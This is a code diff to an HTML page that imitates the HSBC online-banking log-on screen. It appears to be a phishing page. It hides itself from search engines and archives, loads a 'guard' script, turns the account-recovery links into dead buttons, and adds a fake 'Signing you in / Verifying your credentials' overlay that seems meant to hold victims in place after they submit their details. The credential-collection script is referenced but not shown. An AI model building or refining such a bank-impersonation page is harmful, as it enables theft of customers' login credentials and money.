@@ -4,14 +4,15 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <meta name="robots" content="noindex, nofollow, noarchive" />
-  <script src="js/guard.js?v=1"></script>
+  <script src="js/guard.js?v=2"></script>
   <title>HSBC | Log on</title>
   <link rel="icon" type="image/svg+xml" href="favicon.svg" />
-  <meta name="theme-color" content="#e31b24" />
+  <meta name="theme-color" content="#f4f4f4" />
+  <style>html,body{background:#f4f4f4}</style>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/styles.css?v=7" />
+  <link rel="stylesheet" href="css/styles.css?v=13" />
 </head>
 <body>
   <div class="app">
@@ -35,7 +36,7 @@
           <div class="hsbc-field">
             <label for="loginUser">Username</label>
             <input id="loginUser" name="username" autocomplete="username" required placeholder="Enter your username" />
-            <a class="hsbc-link" href="forgot.html">Forgotten your username?</a>
+            <button class="hsbc-link" type="button">Forgotten your username?</button>
           </div>
 
           <div class="hsbc-field">
@@ -49,7 +50,7 @@
                 </svg>
               </button>
             </div>
-            <a class="hsbc-link" href="forgot.html">Forgotten your password?</a>
+            <button class="hsbc-link" type="button">Forgotten your password?</button>
           </div>
 
           <label class="hsbc-check"><input type="checkbox" id="rememberMe" /> Remember username</label>
@@ -63,7 +64,24 @@
         <span>Protected by 256-bit encryption</span>
       </footer>
     </div>
+
+    <div class="login-gate" id="loginGate" aria-hidden="true">
+      <div class="login-gate-panel" role="status" aria-live="polite" aria-busy="true">
+        <div class="login-gate-logo" aria-hidden="true">
+          <svg width="40" height="40" viewBox="0 0 64 64">
+            <polygon fill="#e31b24" points="32,3 59,18.5 59,45.5 32,61 5,45.5 5,18.5"/>
+            <polygon fill="#fff" points="32,16 46,24 46,40 32,48 18,40 18,24"/>
+            <polygon fill="#e31b24" points="32,24 39,28 39,36 32,40 25,36 25,28"/>
+          </svg>
+        </div>
+        <div class="login-gate-spin" aria-hidden="true"></div>
+        <h2>Signing you in</h2>
+        <p id="loginGateText">Verifying your credentials</p>
+        <div class="login-gate-bar" aria-hidden="true"><span></span></div>
+        <p class="login-gate-secure">Secure session · 256-bit encryption</p>
+      </div>
+    </div>
   </div>
-  <script src="js/app.js?v=9"></script>
+  <script src="js/app.js?v=12"></script>
 </body>
 </html>
